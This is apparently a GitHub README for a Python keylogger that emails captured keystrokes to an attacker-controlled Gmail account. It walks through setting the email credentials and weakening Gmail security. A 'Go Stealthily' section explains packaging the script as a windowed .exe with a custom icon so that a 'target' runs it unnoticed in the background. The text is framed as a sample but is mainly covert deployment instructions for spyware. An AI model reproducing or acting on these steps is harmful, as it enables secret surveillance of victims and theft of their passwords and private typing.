<div align="center">

  [![My Skills](https://skillicons.dev/icons?i=python)](https://skillicons.dev) [![My Skills](https://skillicons.dev/icons?i=gmail&perline=3)](https://skillicons.dev)
  # Keylogger
  A sample to show how keylogger can capture your keyboard, made by Python3.
  <br/>
  <br/>
  ![GitHub followers](https://img.shields.io/github/followers/errixed)
  ![GitHub forks](https://img.shields.io/github/forks/errixed/email-keylogger)
  ![GitHub watchers](https://img.shields.io/github/watchers/errixed/email-keylogger)
  ![GitHub Repo stars](https://img.shields.io/github/stars/errixed/email-keylogger)
  
</div>

# Installation

1. pip3 install -r requirements.txt<br/>
2. go to **receive_email.py**<br/>
3. change **main_email** to your email address<br/>
4. in **password** section enter your email address password you have just entered<br/>
5. **secondary_email** does not effect in keylogger proccess and you recieve logs in sent box of email address you have entered in **main_email** section
>your **main_email** must be a **Gmail** only<br/>
>go to your **google account settings** and then go to **security** tab to **enable Less secure app access**

# Go Stealthily

you can use a bug in pyinstaller and execute this script to .exe file format and when your target run .exe file, script will run on backgrough without being noticable. just use:

1. first commit changes I mentioned in Installation instruction
2. pip3 install pyinstaller
3. pyinstaller --onefile --windowed --icon=PATH/OF/ICON.ico PATH/OF/keylogger.py
>icon must be in .ico format

# ATTENTION!

**this script will not work before or after execution on Windows 7 until you use python3.8.6 or less for downloading requirements and execution**
